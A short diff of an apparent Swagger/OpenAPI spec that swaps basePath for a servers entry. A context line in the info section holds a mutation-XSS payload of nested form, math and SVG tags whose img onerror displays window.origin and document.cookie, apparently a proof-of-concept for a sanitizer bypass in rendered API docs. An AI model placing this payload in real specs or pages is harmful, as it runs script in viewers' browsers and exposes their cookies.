@@ -6,7 +6,7 @@ info:
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(`window.origin:\n${window.origin}\n\ndocument.cookies:\n${document.cookie}`) src=1>"></form>
 
   version: production
-basePath: /JSSResource/
+servers: [{ url: '/api' }]
 produces:
   - application/xml
   - application/json
